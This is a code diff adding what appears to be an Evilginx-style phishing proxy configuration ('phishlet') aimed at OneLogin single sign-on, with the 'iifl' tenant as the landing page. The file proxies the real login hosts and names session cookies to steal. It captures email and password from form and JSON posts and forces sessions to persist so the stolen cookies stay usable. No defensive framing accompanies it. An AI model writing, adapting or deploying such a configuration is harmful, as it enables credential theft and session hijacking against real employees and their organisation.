@@ -1,0 +1,47 @@
+name: 'onelogin'
+author: '@manan'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'onelogin.com', session: false, is_landing: false }
+  - {phish_sub: 'iifl', orig_sub: 'iifl', domain: 'onelogin.com', session: true, is_landing: true}
+  - {phish_sub: 'portal-cdn', orig_sub: 'portal-cdn', domain: 'onelogin.com', session: false, is_landing: false}
+
+  - {phish_sub: 'web-login-v2-cdn', orig_sub: 'web-login-v2-cdn', domain: 'onelogin.com', session: false, is_landing: false}
+sub_filters: []
+auth_tokens:
+  - domain: '.onelogin.com'
+    keys: ['onelogin.com_user']
+  - domain: 'iifl.onelogin.com'
+    keys: ['sub_session_onelogin.com']
+auth_urls:
+ - '/portal/'
+ - '/client/apps'
+force_post:
+  - path: '/sessions'
+    search:
+      - {key: 'authenticity_token', search: '.*'}
+      - {key: 'email', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'persist_session', value: 'true'}
+    type: 'post'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  username:
+    key: 'login'
+    search: '"login":"(.*)"'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '"password":"(.*)",'
+    type: 'json'
+login:
+  domain: 'iifl.onelogin.com'
+  path: '/login2'
